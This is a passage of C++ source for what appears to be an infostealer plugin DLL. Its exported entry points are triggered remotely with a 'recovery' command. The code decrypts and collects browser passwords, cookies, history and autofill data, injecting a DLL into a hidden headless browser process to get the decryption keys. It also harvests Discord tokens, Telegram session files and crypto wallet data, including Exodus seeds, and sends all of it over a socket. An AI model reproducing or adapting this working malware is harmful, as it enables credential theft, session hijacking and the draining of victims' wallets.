            try {
                std::stringstream ss_pass; json j_pass = json::array(); for (auto& p : p_data.passwords) { ss_pass << "URL: " << p.url << "\nUser: " << p.username << "\nPass: " << p.password << "\n\n"; j_pass.push_back({{"url", ensure_utf8(p.url)}, {"username", ensure_utf8(p.username)}, {"password", ensure_utf8(p.password)}}); }
                send_recovery_text(sock, "browsers/" + b_name_utf8 + "/" + p_name_sanit + "/passwords.txt", ss_pass.str());
                send_recovery_json(sock, "browsers/" + b_name_utf8 + "/" + p_name_sanit + "/passwords.json", j_pass);

                std::stringstream ss_cook; json j_cook = json::array(); for (auto& c : p_data.cookies) {
                    ss_cook << "Host: " << c.host << " | Name: " << c.name << " | Value: " << c.value << "\n";
                    json cj; std::string hr = c.host; if (hr.find("http") != 0) hr = "https://" + (hr[0] == '.' ? hr.substr(1) : hr); if (hr.back() != '/') hr += "/";
                    cj["Host raw"] = ensure_utf8(hr); cj["Name raw"] = ensure_utf8(c.name); cj["Path raw"] = ensure_utf8(c.path); cj["Content raw"] = ensure_utf8(c.value);
                    long long ut = (c.expires_utc / 1000000) - 11644473600LL; std::time_t t = (std::time_t)ut; struct tm *tmp = std::gmtime(&t); char dbuf[64]; if (tmp && std::strftime(dbuf, sizeof(dbuf), "%d-%m-%Y %H:%M:%S", tmp)) cj["Expires"] = std::string(dbuf);
                    cj["Expires raw"] = std::to_string(ut); cj["Send for"] = c.is_secure ? "Encrypted connections only" : "Any type of connection"; cj["Send for raw"] = c.is_secure ? "true" : "false"; cj["HTTP only raw"] = c.is_httponly ? "true" : "false"; cj["SameSite raw"] = "no_restriction"; cj["This domain only"] = (c.host[0] == '.') ? "false" : "true"; j_cook.push_back(cj);
                }
                send_recovery_text(sock, "browsers/" + b_name_utf8 + "/" + p_name_sanit + "/cookies.txt", ss_cook.str());
                send_recovery_json(sock, "browsers/" + b_name_utf8 + "/" + p_name_sanit + "/cookies.json", j_cook);

                std::stringstream ss_hist; json j_hist = json::array(); for (auto& h : p_data.history) { ss_hist << "URL: " << h.url << " | Title: " << h.title << " | Visits: " << h.visit_count << "\n"; j_hist.push_back({{"url", ensure_utf8(h.url)}, {"title", ensure_utf8(h.title)}, {"visit_count", h.visit_count}}); }
                send_recovery_text(sock, "browsers/" + b_name_utf8 + "/" + p_name_sanit + "/history.txt", ss_hist.str());
                send_recovery_json(sock, "browsers/" + b_name_utf8 + "/" + p_name_sanit + "/history.json", j_hist);

                std::stringstream ss_auto; json j_auto = json::array(); for (auto& a : p_data.autofill) { ss_auto << "Name: " << a.name << " | Value: " << a.value << "\n"; j_auto.push_back({{"name", ensure_utf8(a.name)}, {"value", ensure_utf8(a.value)}}); }
                send_recovery_text(sock, "browsers/" + b_name_utf8 + "/" + p_name_sanit + "/autofill.txt", ss_auto.str());
                send_recovery_json(sock, "browsers/" + b_name_utf8 + "/" + p_name_sanit + "/autofill.json", j_auto);
            } catch (...) {}
        }
    }
    fs::remove_all(temp_dir, ec);
}

void inject_and_collect(SOCKET sock, const std::vector<unsigned char>& dll, const BrowserConfig& browser) {
    wchar_t sz[MAX_PATH]; if (SHGetFolderPathW(NULL, browser.csidl_folder, NULL, 0, sz) != S_OK) return;
    fs::path data = fs::path(sz) / browser.data_path_relative; if (!fs::exists(data)) return;
    bool is_yandex = (browser.name == L"Yandex");
    std::string pass_db_name = is_yandex ? "Ya Passman Data" : "Login Data";
    std::vector<std::string> profs;
    if (fs::exists(data / pass_db_name)) profs.push_back(".");
    if (fs::exists(data / "Default")) profs.push_back("Default");
    std::error_code ec;
    if (fs::exists(data)) { for (const auto& e : fs::directory_iterator(data, ec)) { if (e.is_directory() && e.path().filename().string().find("Profile ") == 0) profs.push_back(e.path().filename().string()); } }
    if (fs::exists(data / "Side Profiles")) { for (const auto& e : fs::directory_iterator(data / "Side Profiles", ec)) { if (e.is_directory()) profs.push_back("Side Profiles/" + e.path().filename().string()); } }
    if (profs.empty()) return;

    HANDLE h_proc = NULL; bool started = false; PROCESS_INFORMATION pi = {0};
    if (browser.use_injection) {
        DWORD pid = find_main_process(browser.exe_name); if (pid) h_proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!h_proc) {
            std::wstring cmd = find_browser_exe(browser.name);
            if (cmd.empty()) cmd = browser.exe_name;
            cmd = L"\"" + cmd + L"\" --headless=new --disable-gpu --disable-software-rasterizer --disable-dev-shm-usage --no-sandbox --disable-setuid-sandbox --disable-extensions --no-first-run --disable-background-networking --disable-renderer-backgrounding --disable-background-timer-throttling --disable-features=VizDisplayCompositor,CalculateNativeWinOcclusion,GlobalMediaControls --log-level=3 --silent-launch about:blank";
            std::vector<wchar_t> buf(cmd.begin(), cmd.end()); buf.push_back(0);
            STARTUPINFOW si = {sizeof(si)};
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
            HANDLE h_nul = CreateFileW(L"NUL", GENERIC_WRITE, FILE_SHARE_WRITE | FILE_SHARE_READ, &sa, OPEN_EXISTING, 0, nullptr);
            if (h_nul != INVALID_HANDLE_VALUE) { si.dwFlags |= STARTF_USESTDHANDLES; si.hStdOutput = h_nul; si.hStdError = h_nul; si.hStdInput = h_nul; }
            if (CreateProcessW(NULL, buf.data(), NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) { h_proc = pi.hProcess; started = true; }
            else {
                if (h_nul != INVALID_HANDLE_VALUE) CloseHandle(h_nul);
                return;
            }
            if (h_nul != INVALID_HANDLE_VALUE) CloseHandle(h_nul);
        }
    }
    HANDLE h_pipe = INVALID_HANDLE_VALUE;
    if (browser.use_injection) { h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 50 * 1024 * 1024, 50 * 1024 * 1024, 0, NULL); if (!dll.empty()) inject_dll_reflective(h_proc, dll); if (started) { ResumeThread(pi.hThread); Sleep(500); } }
    std::vector<unsigned char> v10, v20;
    try {
        std::ifstream f(data / "Local State");
        if (f.is_open()) {
            json j = json::parse(f, nullptr, false);
            if (!j.is_discarded() && j.contains("os_crypt")) {
                auto b = base64_decode(j["os_crypt"]["encrypted_key"]);
                if (b.size() > 5) v10 = decrypt_dpapi(std::vector<unsigned char>(b.begin() + 5, b.end()));
            }
        }
    } catch (...) {}
    if (browser.use_injection && h_pipe != INVALID_HANDLE_VALUE) {
        OVERLAPPED ov = {}; ov.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
        bool pipe_connected = false;
        if (ov.hEvent) {
            BOOL conn = ConnectNamedPipe(h_pipe, &ov);
            DWORD err = GetLastError();
            if (!conn && err == ERROR_IO_PENDING) {
                DWORD wait = WaitForSingleObject(ov.hEvent, 3000);
                pipe_connected = (wait == WAIT_OBJECT_0);
                if (!pipe_connected) CancelIo(h_pipe);
            } else { pipe_connected = (conn || err == ERROR_PIPE_CONNECTED); }
            CloseHandle(ov.hEvent);
        }
        if (pipe_connected) {
            unsigned char buf[1024]; DWORD r = 0;
            OVERLAPPED rov = {}; rov.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
            if (rov.hEvent) {
                if (!ReadFile(h_pipe, buf, sizeof(buf), &r, &rov)) {
                    if (GetLastError() == ERROR_IO_PENDING) {
                        if (WaitForSingleObject(rov.hEvent, 2000) == WAIT_OBJECT_0) GetOverlappedResult(h_pipe, &rov, &r, FALSE);
                        else { CancelIo(h_pipe); r = 0; }
                    } else r = 0;
                }
                CloseHandle(rov.hEvent);
            }
            if (r > 0) v20.assign(buf, buf + r);
        }
        CloseHandle(h_pipe);
    }
    fs::path temp = fs::path(getenv("TEMP") ? getenv("TEMP") : ".") / ("browser_db_" + std::to_string(GetTickCount())); fs::create_directories(temp, ec);
    for (auto& p : profs) {
        fs::path p_path = data / p; ProfileData p_data; p_data.name = p; std::string p_san = p; std::replace(p_san.begin(), p_san.end(), '/', '_'); std::replace(p_san.begin(), p_san.end(), '\\', '_'); std::replace(p_san.begin(), p_san.end(), ':', '_');
        std::string b_name_utf8 = wstring_to_utf8(browser.name);

        fs::path db = p_path / pass_db_name, t_db = temp / (p_san + "_pass.tmp");
        if (copy_db_with_sidecars(db, t_db)) { sqlite3* sdb; if (open_db_for_extraction(wstring_to_utf8(t_db.wstring()), &sdb, true) == SQLITE_OK) { sqlite3_stmt* st; if (sqlite3_prepare_v2(sdb, "SELECT origin_url, username_value, password_value FROM logins", -1, &st, nullptr) == SQLITE_OK) { p_data.passwords.reserve(100); while (sqlite3_step(st) == SQLITE_ROW) { auto b = (const unsigned char*)sqlite3_column_blob(st, 2); int len = sqlite3_column_bytes(st, 2); if (b && len > 0) { auto d = decrypt_blob(std::vector<unsigned char>(b, b + len), v10, v20); if (!d.empty()) p_data.passwords.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1), to_utf8_lossy(d) }); } } sqlite3_finalize(st); } sqlite3_close(sdb); } cleanup_db_temp(t_db); }
        db = p_path / "Network/Cookies"; if (!fs::exists(db)) db = p_path / "Cookies"; t_db = temp / (p_san + "_cook.tmp");
        if (copy_db_with_sidecars(db, t_db)) { sqlite3* sdb; if (open_db_for_extraction(wstring_to_utf8(t_db.wstring()), &sdb, true) == SQLITE_OK) { sqlite3_stmt* st; if (sqlite3_prepare_v2(sdb, "SELECT host_key, name, path, expires_utc, is_secure, is_httponly, samesite, encrypted_value, value FROM cookies", -1, &st, nullptr) == SQLITE_OK) { p_data.cookies.reserve(500); while (sqlite3_step(st) == SQLITE_ROW) { auto b = (const unsigned char*)sqlite3_column_blob(st, 7); int len = sqlite3_column_bytes(st, 7); std::string val; if (b && len > 0) { auto d = decrypt_blob(std::vector<unsigned char>(b, b + len), v10, v20); if (!d.empty()) val = to_utf8_lossy(d); } if (val.empty()) val = get_sqlite_text(st, 8); if (!val.empty()) p_data.cookies.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1), val, get_sqlite_text(st, 2), sqlite3_column_int64(st, 3), (int)sqlite3_column_int(st, 4), (int)sqlite3_column_int(st, 5), (int)sqlite3_column_int(st, 6) }); } sqlite3_finalize(st); } sqlite3_close(sdb); } cleanup_db_temp(t_db); }
        db = p_path / "History"; t_db = temp / (p_san + "_hist.tmp"); if (copy_db_with_sidecars(db, t_db)) { sqlite3* sdb; if (open_db_for_extraction(wstring_to_utf8(t_db.wstring()), &sdb, true) == SQLITE_OK) { sqlite3_stmt* st; if (sqlite3_prepare_v2(sdb, "SELECT url, title, visit_count FROM urls LIMIT 500", -1, &st, nullptr) == SQLITE_OK) { p_data.history.reserve(500); while (sqlite3_step(st) == SQLITE_ROW) p_data.history.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1), (int)sqlite3_column_int(st, 2) }); sqlite3_finalize(st); } sqlite3_close(sdb); } cleanup_db_temp(t_db); }
        db = p_path / "Web Data"; t_db = temp / (p_san + "_web.tmp"); if (copy_db_with_sidecars(db, t_db)) { sqlite3* sdb; if (open_db_for_extraction(wstring_to_utf8(t_db.wstring()), &sdb, true) == SQLITE_OK) { sqlite3_stmt* st; if (sqlite3_prepare_v2(sdb, "SELECT name, value FROM autofill", -1, &st, nullptr) == SQLITE_OK) { p_data.autofill.reserve(100); while (sqlite3_step(st) == SQLITE_ROW) p_data.autofill.push_back({ get_sqlite_text(st, 0), get_sqlite_text(st, 1) }); sqlite3_finalize(st); } sqlite3_close(sdb); } cleanup_db_temp(t_db); }
        if (!p_data.passwords.empty() || !p_data.cookies.empty() || !p_data.history.empty() || !p_data.autofill.empty()) {
            try {
                std::stringstream ss_p; json j_p = json::array(); for (auto& i : p_data.passwords) { ss_p << "URL: " << i.url << "\nUser: " << i.username << "\nPass: " << i.password << "\n\n"; j_p.push_back({{"url", ensure_utf8(i.url)}, {"username", ensure_utf8(i.username)}, {"password", ensure_utf8(i.password)}}); }
                send_recovery_text(sock, "browsers/" + b_name_utf8 + "/" + p_san + "/passwords.txt", ss_p.str());
                send_recovery_json(sock, "browsers/" + b_name_utf8 + "/" + p_san + "/passwords.json", j_p);

                std::stringstream ss_c; json j_c = json::array(); for (auto& i : p_data.cookies) {
                    ss_c << "Host: " << i.host << " | Name: " << i.name << " | Value: " << i.value << "\n";
                    json cj; std::string hr = i.host; if (hr.find("http") != 0) hr = "https://" + (hr[0] == '.' ? hr.substr(1) : hr); if (hr.back() != '/') hr += "/";
                    cj["Host raw"] = ensure_utf8(hr); cj["Name raw"] = ensure_utf8(i.name); cj["Path raw"] = ensure_utf8(i.path); cj["Content raw"] = ensure_utf8(i.value);
                    long long ut = (i.expires_utc / 1000000) - 11644473600LL; std::time_t t = (std::time_t)ut; struct tm *tmp = std::gmtime(&t); char dbuf[64]; if (tmp && std::strftime(dbuf, sizeof(dbuf), "%d-%m-%Y %H:%M:%S", tmp)) cj["Expires"] = std::string(dbuf);
                    cj["Expires raw"] = std::to_string(ut); cj["Send for"] = i.is_secure ? "Encrypted connections only" : "Any type of connection"; cj["Send for raw"] = i.is_secure ? "true" : "false"; cj["HTTP only raw"] = i.is_httponly ? "true" : "false"; cj["SameSite raw"] = "no_restriction"; cj["This domain only"] = (i.host[0] == '.') ? "false" : "true"; j_c.push_back(cj);
                }
                send_recovery_text(sock, "browsers/" + b_name_utf8 + "/" + p_san + "/cookies.txt", ss_c.str());
                send_recovery_json(sock, "browsers/" + b_name_utf8 + "/" + p_san + "/cookies.json", j_c);

                std::stringstream ss_h; json j_h = json::array(); for (auto& h : p_data.history) { ss_h << "URL: " << h.url << " | Title: " << h.title << " | Visits: " << h.visit_count << "\n"; j_h.push_back({{"url", ensure_utf8(h.url)}, {"title", ensure_utf8(h.title)}, {"visit_count", h.visit_count}}); }
                send_recovery_text(sock, "browsers/" + b_name_utf8 + "/" + p_san + "/history.txt", ss_h.str());
                send_recovery_json(sock, "browsers/" + b_name_utf8 + "/" + p_san + "/history.json", j_h);

                std::stringstream ss_a; json j_a = json::array(); for (auto& a : p_data.autofill) { ss_a << "Name: " << a.name << " | Value: " << a.value << "\n"; j_a.push_back({{"name", ensure_utf8(a.name)}, {"value", ensure_utf8(a.value)}}); }
                send_recovery_text(sock, "browsers/" + b_name_utf8 + "/" + p_san + "/autofill.txt", ss_a.str());
                send_recovery_json(sock, "browsers/" + b_name_utf8 + "/" + p_san + "/autofill.json", j_a);
            } catch (...) {}
        }
    }
    fs::remove_all(temp, ec);
    if (started) { TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); } else if (h_proc) CloseHandle(h_proc);
}

struct DiscordConfig { std::wstring name, folder_name; };
const std::vector<DiscordConfig> DISCORDS = { {L"Discord", L"discord"}, {L"Discord Canary", L"discordcanary"}, {L"Discord PTB", L"discordptb"}, {L"Lightcord", L"Lightcord"} };

void collect_discord(SOCKET sock, const DiscordConfig& cfg) {
    wchar_t sz[MAX_PATH]; if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, sz) != S_OK) return;
    fs::path data = fs::path(sz) / cfg.folder_name; if (!fs::exists(data)) return;
    std::vector<unsigned char> key;
    try {
        std::ifstream f(data / "Local State");
        if (f.is_open()) {
            json j = json::parse(f, nullptr, false);
            if (!j.is_discarded() && j.contains("os_crypt")) {
                auto b = base64_decode(j["os_crypt"]["encrypted_key"]);
                if (b.size() > 5) key = decrypt_dpapi(std::vector<unsigned char>(b.begin() + 5, b.end()));
            }
        }
    } catch (...) {}
    std::vector<std::string> tokens; std::regex r_plain(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27,})"), r_mfa(R"(mfa\.[\w-]{84})"), r_enc(R"(dQw4w9WgXcQ:([^"]+))");
    fs::path lvldb = data / "Local Storage/leveldb"; std::error_code ec;
    if (fs::exists(lvldb)) {
        for (const auto& entry : fs::directory_iterator(lvldb, ec)) {
            if (entry.path().extension() == ".ldb" || entry.path().extension() == ".log") {
                try {
                    std::ifstream f(entry.path(), std::ios::binary);
                    if (f.is_open()) {
                        std::stringstream ss; ss << f.rdbuf(); std::string s = ss.str();
                        auto it = std::sregex_iterator(s.begin(), s.end(), r_plain); auto end = std::sregex_iterator(); while (it != end) { tokens.push_back(it->str()); ++it; }
                        it = std::sregex_iterator(s.begin(), s.end(), r_mfa); while (it != end) { tokens.push_back(it->str()); ++it; }
                        it = std::sregex_iterator(s.begin(), s.end(), r_enc); while (it != end) { if (!key.empty()) { auto b = base64_decode(it->str().substr(12)); auto d = aes_gcm_decrypt(key, b); if (!d.empty()) tokens.push_back(std::string(d.begin(), d.end())); } ++it; }
                    }
                } catch (...) {}
            }
        }
    }
    std::sort(tokens.begin(), tokens.end()); tokens.erase(std::unique(tokens.begin(), tokens.end()), tokens.end());
    if (!tokens.empty()) {
        std::stringstream ss; for (auto& t : tokens) ss << t << "\n";
        send_recovery_text(sock, "discord/" + wstring_to_utf8(cfg.name) + "/tokens.txt", ss.str());
    }
}

void collect_telegram(SOCKET sock) {
    std::vector<fs::path> paths; wchar_t sz[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, sz) == S_OK) paths.push_back(fs::path(sz) / L"Telegram Desktop\\tdata");
    if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, sz) == S_OK) paths.push_back(fs::path(sz) / L"Telegram Desktop\\tdata");
    std::error_code ec;
    for (auto& p : paths) {
        if (fs::exists(p)) {
            for (const auto& entry : fs::directory_iterator(p, ec)) {
                std::string fn = entry.path().filename().string();
                if (fn.length() == 16 && std::all_of(fn.begin(), fn.end(), [](char c){ return std::isxdigit(c); })) {
                    for (const auto& sub : fs::directory_iterator(entry.path(), ec)) {
                        if (sub.is_regular_file()) {
                            std::vector<unsigned char> data = read_file_to_vector(sub.path());
                            if (!data.empty()) send_recovery_file(sock, "telegram/tdata/" + fn + "/" + sub.path().filename().string(), data);
                        }
                    }
                }
                else if (fn == "key_datas" || fn == "settingss" || fn == "maps" || fn == "config") {
                    std::vector<unsigned char> data = read_file_to_vector(entry.path());
                    if (!data.empty()) send_recovery_file(sock, "telegram/tdata/" + fn, data);
                }
            }
            break;
        }
    }
}

struct WalletConfig { std::string name; std::vector<std::string> extension_ids; };
static const std::vector<WalletConfig> WALLETS = {
    {"MetaMask",      {"nkbihfbeogaeaoehlefnkodbefgpgknn", "webextension@metamask.io"}},
    {"CoinbaseWallet",{"hnfanknocfeofbddgcijnmhnfnkdnaad", ""}},
    {"Phantom",       {"bfnaelmomeimhlpmgjnjophhpkkoljpa",  ""}},
    {"TrustWallet",   {"egjidjbpglichdcondbcbdnbeeppgdph",  ""}},
    {"OKXWallet",     {"mcohilncbfahbmgdjkbpemcciiolgcge",  ""}},
    {"RoninWallet",   {"fnjhmkhhmkbjkkabndcnnogagogbneec",  ""}},
    {"Keplr",         {"dmkamcknogkgcdfhhbddcghachkejeap",  ""}},
    {"Solflare",      {"bhhhlbepdkbapadjdnnojkbgioiodbic",  ""}},
    {"ExodusWeb3",    {"aholpfdialjgjfinsifejlpenmdbchdc",  ""}},
    {"Rabby",         {"acmacodkjbdgmoleebolmdjonilkdbch",  ""}},
    {"Backpack",      {"aflkmfhebedbjioipglgcbcmnbpgliof",  ""}},
    {"SuiWallet",     {"opcgpfmipidbgpenhmajoajpbobppdil",  ""}},
    {"CoreWallet",    {"agoakfejjabomempkjlepdflaleeobhb",  ""}},
    {"Uniswap",       {"nnpmfplkfogfpmcngplhnbdnnilmcdln",  ""}},
    {"Enkrypt",       {"kktoiinmkkbbonddmfgaakmjboaieego",  "enkrypt@enkrypt.io"}},
    {"Taho",          {"eajafomhmkipbjmfmhebemolkcicgfmd",  ""}},
    {"Zerion",        {"klghhnkeealcohjjanjjdaeeggmfmlpl",  ""}},
};

void send_extension_storage(SOCKET sock, const fs::path& src_dir, const std::string& rel_base) {
    if (!fs::exists(src_dir)) return;
    std::error_code ec;
    try {
        for (const auto& entry : fs::directory_iterator(src_dir, ec)) {
            if (!entry.is_regular_file(ec)) continue;
            std::string ext = entry.path().extension().string();
            std::string fname = entry.path().filename().string();
            if (ext == ".ldb" || ext == ".log" || ext == ".sst" || fname == "MANIFEST" || fname == "CURRENT" || fname == "LOCK") {
                std::ifstream f(entry.path(), std::ios::binary);
                if (f.is_open()) {
                    std::vector<unsigned char> data((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
                    send_recovery_file(sock, rel_base + "/" + fname, data);
                }
            }
        }
    } catch (...) {}
}

std::string get_firefox_extension_uuid(const fs::path& prof_path, const std::string& ext_id) {
    fs::path prefs_path = prof_path / "prefs.js";
    if (!fs::exists(prefs_path)) return "";
    try {
        std::ifstream file(prefs_path);
        if (!file.is_open()) return "";
        std::string line;
        while (std::getline(file, line)) {
            if (line.find("extensions.webextensions.uuids") != std::string::npos) {
                size_t start_brace = line.find('{');
                size_t end_brace = line.rfind('}');
                if (start_brace != std::string::npos && end_brace != std::string::npos && end_brace > start_brace) {
                    std::string json_str = line.substr(start_brace, end_brace - start_brace + 1);
                    std::string clean_json = "";
                    for (size_t i = 0; i < json_str.size(); ++i) { if (json_str[i] == '\\' && i + 1 < json_str.size() && json_str[i+1] == '"') { clean_json += '"'; i++; } else { clean_json += json_str[i]; } }
                    try { json j = json::parse(clean_json, nullptr, false); if (!j.is_discarded() && j.contains(ext_id)) return j[ext_id].get<std::string>(); } catch (...) {}
                }
            }
        }
    } catch (...) {}
    return "";
}

void collect_wallets(SOCKET sock) {
    for (const auto& browser : BROWSERS) {
        if (browser.is_firefox_based) {
            wchar_t sz[MAX_PATH]; if (SHGetFolderPathW(NULL, browser.csidl_folder, NULL, 0, sz) != S_OK) continue;
            fs::path data = fs::path(sz) / browser.data_path_relative; if (!fs::exists(data)) continue;
            std::vector<fs::path> profile_paths; fs::path ini_path = data / "profiles.ini";
            if (fs::exists(ini_path)) {
                std::ifstream f(ini_path); if (f.is_open()) {
                    std::string line, section; std::map<std::string, std::map<std::string, std::string>> sections;
                    while (std::getline(f, line)) { if (!line.empty() && line.back() == '\r') line.pop_back(); if (line.empty()) continue; if (line[0] == '[') { size_t end = line.find(']'); if (end != std::string::npos) section = line.substr(1, end - 1); } else { size_t pos = line.find('='); if (pos != std::string::npos) sections[section][line.substr(0, pos)] = line.substr(pos + 1); } }
                    for (auto const& [s_name, props] : sections) { if (props.count("Path")) { bool is_rel = (props.count("IsRelative") && props.at("IsRelative") == "1"); std::string p_str = props.at("Path"); fs::path p = is_rel ? (data / p_str) : fs::path(p_str); if (!fs::exists(p)) p = data / "Profiles" / p_str; if (fs::exists(p)) profile_paths.push_back(p); } }
                }
            }
            for (const auto& prof_path : profile_paths) {
                std::string prof_name = prof_path.filename().string(); std::string b_name = wstring_to_utf8(browser.name);
                for (const auto& wallet : WALLETS) {
                    if (wallet.extension_ids.size() < 2 || wallet.extension_ids[1].empty()) continue;
                    fs::path storage_base = prof_path / "storage" / "default";
                    if (fs::exists(storage_base)) {
                        std::string uuid = get_firefox_extension_uuid(prof_path, wallet.extension_ids[1]);
                        if (!uuid.empty()) {
                            fs::path idb = storage_base / ("moz-extension+++" + uuid) / "idb";
                            if (fs::exists(idb)) {
                                std::error_code ec; for (const auto& f : fs::directory_iterator(idb, ec)) { if (f.path().extension() == ".sqlite" || f.path().extension() == ".files") { std::vector<unsigned char> d = read_file_to_vector(f.path()); if (!d.empty()) send_recovery_file(sock, "wallets/" + wallet.name + "/browsers/" + b_name + "/" + prof_name + "/" + f.path().filename().string(), d); } }
                            }
                        }
                    }
                    fs::path les_ff = prof_path / "browser-extension-data" / wallet.extension_ids[1];
                    if (fs::exists(les_ff)) { std::error_code ec; for (const auto& f : fs::directory_iterator(les_ff, ec)) { if (f.is_regular_file(ec)) { std::vector<unsigned char> d = read_file_to_vector(f.path()); if (!d.empty()) send_recovery_file(sock, "wallets/" + wallet.name + "/browsers/" + b_name + "/" + prof_name + "/" + f.path().filename().string(), d); } } }
                }
            }
        } else {
            wchar_t sz[MAX_PATH]; if (SHGetFolderPathW(NULL, browser.csidl_folder, NULL, 0, sz) != S_OK) continue;
            fs::path data = fs::path(sz) / browser.data_path_relative; if (!fs::exists(data)) continue;
            std::vector<fs::path> profile_dirs; if (fs::exists(data / "Login Data") || fs::exists(data / "Ya Passman Data")) profile_dirs.push_back(data); if (fs::exists(data / "Default")) profile_dirs.push_back(data / "Default");
            std::error_code ec; for (const auto& e : fs::directory_iterator(data, ec)) { if (e.is_directory(ec) && e.path().filename().string().find("Profile ") == 0) profile_dirs.push_back(e.path()); }
            for (const auto& prof_path : profile_dirs) {
                std::string prof_name = prof_path.filename().string(); if (prof_name.empty() || prof_name == data.filename().string()) prof_name = "Default";
                fs::path les = prof_path / "Local Extension Settings"; if (!fs::exists(les)) continue;
                for (const auto& wallet : WALLETS) { if (wallet.extension_ids.empty() || wallet.extension_ids[0].empty()) continue; send_extension_storage(sock, les / wallet.extension_ids[0], "wallets/" + wallet.name + "/browsers/" + wstring_to_utf8(browser.name) + "/" + prof_name); }
            }
        }
    }
    // Exodus
    wchar_t appdata_buf[MAX_PATH]; if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata_buf) == S_OK) {
        fs::path exodus_base = fs::path(appdata_buf) / L"Exodus";
        if (fs::exists(exodus_base)) {
            fs::path wallet_dir = exodus_base / "exodus.wallet";
            if (fs::exists(wallet_dir)) { std::error_code ec; for (const auto& entry : fs::directory_iterator(wallet_dir, ec)) { if (!entry.is_regular_file(ec)) continue; std::string fext = entry.path().extension().string(); std::string fname = entry.path().filename().string(); if (fext == ".ldb" || fext == ".log" || fext == ".sst" || fext == ".json" || fext == ".seed" || fext == ".dat" || fname == "MANIFEST" || fname == "CURRENT" || fname == "LOCK") { std::vector<unsigned char> d = read_file_to_vector(entry.path()); if (!d.empty()) send_recovery_file(sock, "wallets/ExodusDesktop/exodus.wallet/" + fname, d); } } }
            fs::path backups_dir = exodus_base / "backups";
            if (fs::exists(backups_dir)) { std::error_code ec; for (const auto& entry : fs::directory_iterator(backups_dir, ec)) { if (!entry.is_regular_file(ec)) continue; std::vector<unsigned char> d = read_file_to_vector(entry.path()); if (!d.empty()) send_recovery_file(sock, "wallets/ExodusDesktop/backups/" + entry.path().filename().string(), d); } }
            static const std::vector<std::wstring> EXODUS_ROOT_FILES = { L"passphrase.json", L"seed.seco", L"info.json" };
            for (const auto& fn : EXODUS_ROOT_FILES) { fs::path fp = exodus_base / fn; if (fs::exists(fp)) { std::vector<unsigned char> d = read_file_to_vector(fp); if (!d.empty()) send_recovery_file(sock, "wallets/ExodusDesktop/config/" + fs::path(fn).filename().string(), d); } }
        }
    }
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    std::vector<unsigned char> dll;
    try {
        if (!EMBEDDED_DLL_BASE64.empty()) { dll = base64_decode(EMBEDDED_DLL_BASE64); }
        else { dll = read_file_to_vector("proxydll.dll"); }
    } catch (...) {}

    for (const auto& c : BROWSERS) {
        try { if (c.is_firefox_based) collect_firefox(sock, c); else inject_and_collect(sock, dll, c); } catch (...) {}
    }
    for (const auto& d : DISCORDS) { try { collect_discord(sock, d); } catch (...) {} }
    try { collect_telegram(sock); } catch (...) {}
    try { collect_wallets(sock); } catch (...) {}
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    try {
        if (!commandJson) return;
        json command = json::parse(commandJson);
        std::string action = command.value("action", "");
        if (action == "recovery") { RunPlugin(sock); }
    } catch (...) {}
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
